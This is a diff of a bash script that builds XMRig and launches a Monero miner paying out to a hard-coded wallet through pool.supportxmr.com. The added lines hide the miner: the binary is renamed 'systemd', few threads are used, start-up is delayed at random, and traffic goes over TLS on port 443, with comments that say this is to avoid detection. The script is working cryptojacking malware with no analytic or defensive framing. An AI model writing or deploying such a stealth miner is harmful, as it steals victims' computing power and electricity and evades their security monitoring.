@@ -1,21 +1,31 @@
 #!/bin/bash
 
-# --- Configuration ---
+### CONFIGURATION ###
 WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
-POOL="pool.supportxmr.com:3333"
-WORKER_ID="stealth-$(hostname)"
-THREADS=8  # use fewer threads to reduce detection risk
+POOL="pool.supportxmr.com:443"
+THREADS=2
+ALIAS_NAME="systemd"  # disguises the process
+WORKER_ID="node-$(hostname)"
 
-# --- Install xmrig if not found ---
-if ! command -v xmrig &> /dev/null; then
-    echo "Installing XMRig..."
+### INSTALL DEPENDENCIES ###
+install_xmrig() {
     sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
     git clone https://github.com/xmrig/xmrig.git
     mkdir xmrig/build && cd xmrig/build
     cmake .. && make -j$(nproc)
     cd ../..
-fi
+    mv xmrig/build/xmrig ./$ALIAS_NAME  # disguise the binary
+}
 
-# --- Start Mining ---
-echo "Starting miner with low thread count to avoid detection..."
-nohup ./xmrig/build/xmrig -o $POOL -u $WALLET -k --donate-level 1 -t $THREADS -p $WORKER_ID > miner.log 2>&1 &
+### SETUP ###
+[ ! -f "./$ALIAS_NAME" ] && install_xmrig
+
+### RANDOM SLEEP TO AVOID PATTERNS ###
+sleep_time=$((RANDOM % 300))  # up to 5 minutes
+echo "[*] Sleeping for $sleep_time seconds to avoid detection..."
+sleep $sleep_time
+
+### LAUNCH MINER IN BACKGROUND ###
+echo "[*] Starting miner..."
+nohup ./$ALIAS_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls -t $THREADS --donate-level 1 > /dev/null 2>&1 &
+echo "[+] Mining started with alias '$ALIAS_NAME'. Check running processes."
